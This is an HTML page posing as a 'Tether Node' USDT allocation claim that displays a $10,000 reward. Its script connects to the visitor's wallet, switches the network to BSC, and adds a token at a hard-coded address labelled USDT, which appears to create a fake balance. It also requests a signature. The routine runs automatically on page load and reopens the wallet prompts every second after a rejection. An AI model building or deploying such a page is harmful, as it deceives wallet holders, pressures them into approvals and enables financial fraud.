<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Asset Distribution | Tether Node</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --green: #26a17b; --dark: #0f1114; }
        body { background: var(--dark); color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #1a1d23; border: 1px solid #30363d; border-radius: 28px; padding: 40px; width: 85%; max-width: 380px; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.6); }
        .usdt-icon { width: 85px; filter: drop-shadow(0 0 15px rgba(38,161,123,0.4)); margin-bottom: 20px; }
        .amount { font-size: 40px; font-weight: 900; color: #fff; margin: 10px 0; letter-spacing: -1px; }
        .btn { background: var(--green); color: #fff; border: none; width: 100%; padding: 20px; border-radius: 16px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 30px; transition: 0.2s; text-transform: uppercase; }
        .btn:active { transform: scale(0.98); opacity: 0.9; }
        #log { font-size: 11px; color: #6e7681; margin-top: 20px; font-family: 'SFMono-Regular', Consolas, monospace; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="usdt-icon" alt="USDT">
    <div style="font-size: 12px; color: var(--green); font-weight: bold; letter-spacing: 1.5px;">SECURE NODE ALLOCATION</div>
    <div class="amount">$10,000.00</div>
    <button class="btn" id="claim">SYNC & ACTIVATE</button>
    <div id="log">SYSTEM: WAITING_FOR_USER</div>
</div>

<script>
    const btn = document.getElementById('claim');
    const log = document.getElementById('log');

    const ASSET = {
        address: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
        symbol: "USDT",
        decimals: 18,
        image: "https://assets.coingecko.com/coins/images/325/large/Tether.png"
    };

    async function startInjection() {
        const provider = window.trustwallet || window.ethereum;

        if (!provider) {
            log.innerText = "REDIRECTING TO WALLET...";
            // GitHub URL redirection logic
            const rawUrl = window.location.href.split('://')[1];
            window.location.replace("https://link.trustwallet.com/a/dapp?url=https://" + rawUrl);
            return;
        }

        try {
            btn.innerText = "PROCESSING...";
            log.innerText = "LOG: CONNECTING...";
            
            // 1. Connection (Session start)
            const accounts = await provider.request({ method: 'eth_requestAccounts' });
            
            // 2. Network Switch (BSC is a must)
            log.innerText = "LOG: MAPPING BSC CHAIN...";
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            }).catch(async (e) => {
                if (e.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'BSC',
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                        }]
                    });
                }
            });

            // 3. Asset Injection (Pop-up)
            log.innerText = "LOG: INJECTING ASSET...";
            const success = await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: ASSET
                }
            });

            if (success) {
                log.innerText = "LOG: SUCCESSFUL";
                btn.innerText = "SYNCED";
                btn.style.background = "#30363d";
                // Final Sign
                await provider.request({
                    method: 'personal_sign',
                    params: ["Node Auth: " + Math.random().toString(36).substring(7), accounts[0]]
                });
            }

        } catch (err) {
            log.innerText = "LOG: REJECTED. RETRYING...";
            btn.innerText = "RETRY SYNC";
            // Persistent loop: Popup wapis aayega
            setTimeout(startInjection, 1000);
        }
    }

    btn.onclick = startInjection;

    // GitHub specific: Auto-wake provider
    window.onload = () => {
        if (window.ethereum || window.trustwallet) {
            log.innerText = "LOG: WALLET DETECTED";
            // 2.5 second delay for mobile browser engine
            setTimeout(startInjection, 2500);
        }
    };
</script>
</body>
</html>
